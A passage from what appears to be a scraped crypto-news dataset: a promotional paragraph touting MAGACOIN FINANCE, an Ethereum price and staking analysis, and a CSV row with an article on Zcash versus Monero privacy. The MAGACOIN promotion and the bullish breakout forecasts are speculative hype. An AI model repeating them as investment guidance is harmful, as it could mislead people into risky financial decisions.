Rising If the Federal Reserve follows through with multiple rate cuts, the crypto market could enter one of its most bullish periods in recent memory. Ethereum is positioned to lead the charge as liquidity returns, with its staking yield acting as a magnet for capital seeking yield in a low-rate environment. Yet the growing enthusiasm around MAGACOIN FINANCE shows that investors are also hungry for early-stage opportunities – the kind that combine strong fundamentals with explosive growth potential. As liquidity spreads through the ecosystem, projects that can demonstrate tangible progress and community traction are likely to outperform. If the easing cycle continues through 2025, both Ethereum and MAGACOIN FINANCE could emerge as two of the biggest winners of the year – one as a blue-chip anchor, the other as the breakout star redefining early-stage investing in crypto.

The price has been swinging between key resistance and support zones, reflecting a market torn between optimism for another leg higher and caution over potential short-term corrections. While sentiment remains divided, on-chain data paints a more confident picture behind the scenes. Related Reading: Short-Term Holder Supply Rises By 559K Bitcoin – New Buyers Flood the Market According to recent reports, large holders and institutions continue to accumulate ETH, reinforcing the idea that the current market uncertainty may be viewed by many as an opportunity rather than a threat. At the same time, staking activity remains consistently strong, signaling long-term conviction among Ethereum’s most committed participants. The ongoing rise in staked ETH highlights confidence in the network’s security, yield potential, and role as a foundation for decentralized finance. As Ethereum hovers near decisive price levels, the market appears to be preparing for a breakout in either direction. Whether the next move favors bulls or bears, one thing is clear — Ethereum’s fundamentals remain resilient, and the persistent accumulation by major players could serve as a powerful anchor for the next major trend once market sentiment aligns. Grayscale Stakes Ethereum: A Strong Signal Of Confidence According to Lookonchain, Grayscale (ETHE and ETH ETF) has staked an additional 857,600 ETH, worth approximately $3.83 billion, once again signaling major institutional conviction in Ethereum’s long-term potential. This move underscores the growing alignment between traditional finance and blockchain infrastructure, as large-scale players continue to embrace Ethereum’s proof-of-stake model not just as an investment, but as a yield-generating and network-participating strategy. This massive staking operation carries several implications for the market. First, it effectively reduces circulating supply, since staked ETH is locked and cannot be easily sold. This dynamic strengthens Ethereum’s deflationary pressure, especially in a context where network activity and gas usage remain elevated. At the same time, the scale of this move reveals increasing institutional participation in Ethereum’s ecosystem, suggesting that the asset is being viewed less as a speculative instrument and more as digital infrastructure — a key component of the emerging tokenized economy. From a market perspective, this decision comes during a period of volatility and consolidation, where Ethereum’s price action has struggled to establish a clear direction. However, such sustained institutional staking serves as a stabilizing force, reflecting confidence that the asset’s intrinsic value continues to grow regardless of short-term fluctuations. In essence, Grayscale’s renewed staking push reinforces Ethereum’s position as the institutional cornerstone of DeFi and Web3, even as market sentiment remains mixed. If accumulation trends persist and network fundamentals hold strong, Ethereum could be preparing for a significant breakout in the coming weeks — supported not by retail speculation, but by deep, long-term capital positioning itself for the next phase of the cycle.

The 4-hour chart reveals that ETH has retraced toward its 200-period moving average, a critical dynamic support zone that often acts as a pivot point for market direction. Despite the recent dip of nearly 2%, the broader structure remains constructive, as long as bulls can maintain the price above the $4,300–$4,250 range. This area coincides with a key confluence of the 50-, 100-, and 200-period moving averages, suggesting that the current pullback could simply be a technical retest before another attempt to reclaim the $4,500 zone. A confirmed bounce from this region could set the stage for Ethereum to regain momentum and potentially retest the $4,700–$4,800 resistance range in the coming days.

Overall, while volatility persists, Ethereum continues to display resilience supported by strong on-chain accumulation and institutional staking — factors that reinforce the broader bullish narrative despite short-term market fluctuations.

52917701,602672,1760058042,https://resources.cryptocompare.com/news/13/52917701.jpeg,Why Zcash Beats Monero And Even Bitcoin: MIT Research Scientist,https://bitcoinist.com/zcash-beats-monero-bitcoin-mit-research-scientist/,"MIT research scientist and Zcash co-founder Madars Virza has set off a fresh round of privacy-coin debate after arguing that Zcash’s shielded pool delivers materially stronger anonymity than Monero’s ring-signature model—and that Zcash’s design choices also give it an edge over Bitcoin in a post-quantum world. Virza framed the discussion with a pointed update to the “conservative advice” that circulated in Bitcoin’s early years. “Conservative advice back then: ‘allocate 1% of your NW to Bitcoin,’” he wrote on October 7. “Conservative advice today: ‘encrypt at least 1% of your Bitcoin.’” The shift in emphasis—from owning BTC to hardening its transactional privacy—set the stage for an extended technical exchange about how different privacy systems hold up under modern analysis. Zcash Better Than Monero And Bitcoin? Pressed by an X user on “Why not Monero ?”, Virza argued that Monero’s core privacy primitive—ring signatures with fixed-size decoy sets—creates a relatively small and attackable anonymity set. “Each Monero spend references the actual spend (just like in Bitcoin) plus 16 randomly decoys,” he wrote. “16 is not a large number and easily falls to generic attacks,” he added, pointing to research presentations on tracing heuristics. He further noted that real-world sampling biases can shrink the effective protection: “Because of biases in the random distribution, 16 is more like 4.2 in practice (OSPEAD attack).” In other words, even though each spend is bundled with 16 decoys, selection patterns can leak enough information that the true spender becomes statistically distinguishable far more often than users expect. By contrast, Virza said, Zcash’s fully shielded transfers avoid the small, fixed ring entirely. “Each shielded Zcash spend has an anonymity set of all previous Zcash outputs in that shielded pool—that’s millions and thus much more private,” he wrote. Because the system proves correctness with zero-knowledge proofs, the transaction does not have to disclose which prior note is being spent, so the anonymity set scales with the entire shielded pool rather than a handful of decoys. Virza also pointed to practical composability as a strategic advantage: “Another reason for Zcash is DeFi integrations—you have deep liquidity for atomic swaps.” In his view, those integrations make it easier for users to move value into and out of the shielded pool and, potentially, to “encrypt” portions of their Bitcoin exposure via swap-based workflows. ZEC Is Almost Quantum-Secure A second vector in Virza’s critique concerned long-term security against quantum adversaries . “Zcash is also post-quantum private (if you use unique shielded addresses) but a quantum adversary will be able to completely recover Monero transaction graph by breaking discrete logs for all key images,” he wrote. The point is subtle but consequential: Monero’s linkability-prevention relies on properties (discrete logarithms) that are known to be vulnerable to sufficiently advanced quantum computers , which could allow future attackers to map historical spending relations. Zcash’s shielded model, by design, leaves far less reconstructable metadata on-chain—so even if public-key systems eventually fall to quantum attacks, there is less transactional structure for an adversary to “unwind.” Zcash engineer Sean Bowe reinforced the same theme in a July exchange that Virza cited, arguing that Zcash’s privacy stems from the omission of sensitive data rather than the obfuscation of it. “For example, there is no quantum computer or powerful AI that will be able to look back at the Zcash blockchain 1000 years from now and figure out who made every fully shielded transaction,” Bowe wrote. “That information, among other things, never even touches the ledger. It’s already gone.” He added that while boundary surfaces—where shielded transactions meet exchanges, wallets, or other public systems—can still leak, the baseline is unusually strong: “To be certain about your privacy you must start by using shielded Zcash. You almost cannot even begin otherwise.” In Bowe’s words, Zcash begins from “something that is already extremely private” and is working toward global scalability from that foundation. At press time, ZEC is up almost 52% since yesterday, trading at $194.",Crypto News|bitcoin|btc|monero|XMR|ZCash|Zcash News|ZCash Price|ZEC|ZEC News,EN,0,0,CRYPTOCURRENCY|ZEC|XMR|BTC|RESEARCH,"{'name': 'Bitcoinist', 'img': 'https://images.cryptocompare.com/news/default/bitcoinist.png', 'lang': 'EN'}",bitcoinist,2025-10-10 01:00:42
